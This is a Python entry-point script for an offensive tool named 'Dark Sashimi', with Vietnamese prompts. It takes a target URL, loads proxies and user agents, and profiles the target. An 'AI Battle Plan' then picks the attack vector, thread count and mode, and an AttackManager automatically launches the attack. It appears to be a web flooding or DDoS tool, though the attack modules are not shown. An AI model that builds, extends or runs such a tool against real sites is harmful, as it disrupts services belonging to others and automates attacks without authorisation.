from rich.console import Console
from rich.panel import Panel
from core.analytics import TargetAnalytics
from core.ai_analyzer import AIAnalyzer
from core.attack_manager import AttackManager
from network import ProxyManager, fetch_user_agents
import config
import time

console = Console()

def semi_auto_main():
    console.clear()
    console.print(Panel.fit(
        f"[bold magenta]{config.PROJECT_NAME}[/bold magenta]\n[cyan]{config.CREATOR}[/cyan]\n[bright_yellow]Phiên bản: {config.VERSION}[/bright_yellow]",
        title="🚀 Dark Sashimi", title_align="left")
    )

    # Bắt buộc người dùng nhập URL mục tiêu (không nhập sẽ thoát)
    target_url = console.input("[bold yellow]Nhập URL mục tiêu (bao gồm http/https): [/bold yellow]").strip()
    if not target_url:
        console.print("[red]Không có URL, thoát![/red]")
        return

    fetch_user_agents()
    ProxyManager().load_proxies()

    analytics = TargetAnalytics(target_url)
    target_info, response_obj = analytics.run_analysis()
    if not target_info or not response_obj:
        console.print("[bold red]Không thể phân tích mục tiêu![/bold red]")
        return

    plan = AIAnalyzer(target_info, response_obj).generate_plan()
    console.print(Panel.fit(
        f"[b cyan]AI Đề Xuất Chiến Dịch:[/b cyan]\n"
        f"• Vector: [b]{plan['vector']}[/b]\n"
        f"• Threads: [b]{plan['threads']}[/b]\n"
        f"• Mode: [b]{plan['mode']}[/b]\n"
        f"• Threat Level: {plan['threat_level']}\n"
        f"• Report: {plan['summary_report']}", title="🤖 AI Battle Plan", border_style="bright_magenta"))

    # Tự động tấn công theo AI
    time.sleep(2)
    attack = AttackManager(
        target_url=target_url,
        vector_choice=plan["vector_id"],
        mode=plan["mode"],
        threads=plan["threads"]
    )
    attack.start_attack()
    console.print(Panel.fit("[bold green]Chiến dịch đã kết thúc![/bold green]", border_style="green"))

if __name__ == "__main__":
    semi_auto_main()
